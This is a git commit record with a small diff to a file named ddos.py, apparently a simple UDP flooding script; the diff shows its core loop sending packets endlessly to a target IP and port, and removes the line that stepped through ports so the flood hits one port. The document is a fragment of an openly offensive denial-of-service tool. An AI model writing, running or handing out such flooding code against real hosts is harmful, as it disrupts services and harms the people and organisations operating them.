cfc8df945476e8a1053a71d92b73bc0d5adc2cf2
netbriler <netbriler@gmail.com>
2020-10-27 13:04:23 +0200

    Posr fix

--- ddos.py
+++ ddos.py
@@ -29,7 +29,6 @@ sent = 0
 while True:
     sock.sendto(bytes, (ip, port))
     sent = sent + 1
-    port = port + 1
     print("Sent %s packet to %s throught port:%s" % (sent, ip, int(port)))
     if port == 65534:
         port = 1
